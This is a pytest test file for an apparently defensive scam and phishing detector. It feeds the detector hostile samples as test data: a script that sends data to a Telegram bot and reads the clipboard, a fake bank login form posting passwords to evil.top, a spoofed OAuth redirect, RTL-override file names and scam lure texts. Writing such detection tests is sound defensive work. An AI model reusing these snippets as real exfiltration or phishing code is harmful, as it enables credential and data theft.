import json, sys
from pathlib import Path
import numpy as np, pytest
ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))
from scamguard import features_url as fu, rules, scoring
from scamguard.features_content import CONTENT_FEATURES, extract_content
from scamguard.i18n import explain, LANGS


def test_vector_shape_and_garbage():
    for u in ["", "   ", "http://", "://x", "a" * 5000, "http://[::1]:99/x", "javascript:alert(1)", "‮evil.exe", "http://xn--a.com"]:
        v = fu.vector(u)
        assert len(v) == len(fu.FEATURE_NAMES) and all(np.isfinite(v))


def test_known_features():
    f = fu.extract("http://user@192.168.1.1:8080/login.php?u=http://x.y")
    assert f["is_ip_host"] == 1 and f["has_userinfo"] == 1 and f["nonstd_port"] == 1 and f["query_has_url"] == 1
    assert fu.registered_domain("a.b.example.co.ug") == "example.co.ug"
    assert fu.extract("https://paypal-secure.xyz")["brand_in_regdomain_extra"] == 1
    assert fu.extract("https://www.paypal.com")["brand_in_subdomain"] == 0


def test_text_rules():
    ids = {f.id for f in rules.check_text("Congratulations you won a prize! Pay a small processing fee for your loan. Act now")}
    assert {"prize_scam", "loan_scam", "urgency_pressure"} <= ids
    assert not rules.check_text("Meeting at 3pm in the Kampala office, see you there.")


def test_whatsapp_rules():
    assert any(f.id == "wa_takeover_lure" for f in rules.check_whatsapp("", "please send me the 6-digit code you just received on WhatsApp"))
    assert any(f.id == "wa_fake_app" for f in rules.check_whatsapp("https://gbwhatsapp-download.top/get"))
    assert not rules.check_whatsapp("https://wa.me/256700000000")


def test_files():
    ids = lambda n: {f.id for f in rules.check_file(n)}
    assert "file_double_ext" in ids("Invoice.pdf.exe")
    assert "file_macro_doc" in ids("salary.xlsm")
    assert "file_rtl_override" in ids("photo‮gpj.exe")
    assert "file_unknown_ext" in ids("report.xyzq")
    assert not ids("holiday.jpg")


def test_oauth_app_usb():
    assert any(f.id == "oauth_redirect_mismatch" for f in rules.check_oauth_url("https://evil.xyz/authorize?client_id=1&redirect_uri=https://x.top/cb&response_type=code"))
    assert rules.check_app(["android.permission.BIND_ACCESSIBILITY_SERVICE", "android.permission.SYSTEM_ALERT_WINDOW"])
    assert not rules.check_app(["android.permission.INTERNET"])
    assert any(f.id == "usb_hid_on_cable" for f in rules.check_usb({"interfaces": [3], "expected": "charge"}))


def test_html_api_sniff():
    h = '<script>fetch("https://api.telegram.org/bot1:AA/send");navigator.clipboard.readText()</script>'
    assert {"exfil_telegram_bot", "clipboard_read"} <= {f.id for f in rules.check_html(h, "http://x.com")}
    assert not rules.check_html("<html><body><h1>Hello</h1></body></html>", "https://x.com")


def test_content_features():
    html = '<html><head><title>MyBank</title><meta name="viewport" content="x"></head><body><form action="https://evil.top/p"><input type="password"><input type="hidden"><button type="submit">Go</button></form><a href="#">x</a><a href="https://other.com">y</a></body></html>'
    c = extract_content(html, "https://mybank.example.com/")
    assert c["HasPasswordField"] == 1 and c["HasExternalFormSubmit"] == 1 and c["NoOfEmptyRef"] == 1 and c["NoOfExternalRef"] == 1
    assert set(c) == set(CONTENT_FEATURES)


def test_scoring_monotonic():
    a = scoring.combine(0.2, [])["risk"]; b = scoring.combine(0.7, [])["risk"]; c = scoring.combine(0.99, [])["risk"]
    assert a < b < c and scoring.combine(0.99, [])["verdict"] == "dangerous"


def test_i18n_fallback():
    assert "sw" in LANGS and "fr" in LANGS
    assert explain("ip_host", "sw")["title"] != explain("ip_host", "en")["title"]
    assert explain("exfil_telegram_bot", "sw")["title"] == explain("exfil_telegram_bot", "en")["title"]  # falls back to English


models = ROOT / "models" / "url_device.onnx"


@pytest.mark.skipif(not models.exists(), reason="train first")
def test_scanner_end_to_end_and_onnx_parity():
    from scamguard.predict import Scanner
    s = Scanner()
    assert s.scan_url("http://mpesa-loan-approved.xyz/apply?id=123")["verdict"] == "dangerous"
    assert s.scan_url("https://www.google.com/")["verdict"] == "low_risk"
    # ONNX == sklearn? (device model has no joblib; just check probability range & determinism)
    p1, p2 = s.url_prob("http://a.top/x", "device"), s.url_prob("http://a.top/x", "device")
    assert 0 <= p1 <= 1 and p1 == p2


def test_deep_training_plumbing(tmp_path):
    """Plumbing check on a tiny *synthetic fixture* (not real data, no quality claim)."""
    import pandas as pd
    from scamguard import train_deep
    rng = np.random.default_rng(0)
    rows = []
    for i in range(300):
        lab = i % 2
        r = {"url": f"http://site{i}{'.xyz' if lab else '.com'}/p", "label": lab}
        r.update({c: float(rng.integers(0, 3) + (2 * lab if c == "HasPasswordField" else 0)) for c in CONTENT_FEATURES})
        rows.append(r)
    p = tmp_path / "c.csv"; pd.DataFrame(rows).to_csv(p, index=False)
    train_deep.main(["--phiusiil", str(tmp_path / "none.csv"), "--collected", str(p), "--out", str(tmp_path)])
    assert (tmp_path / "deep_ensemble.joblib").exists()
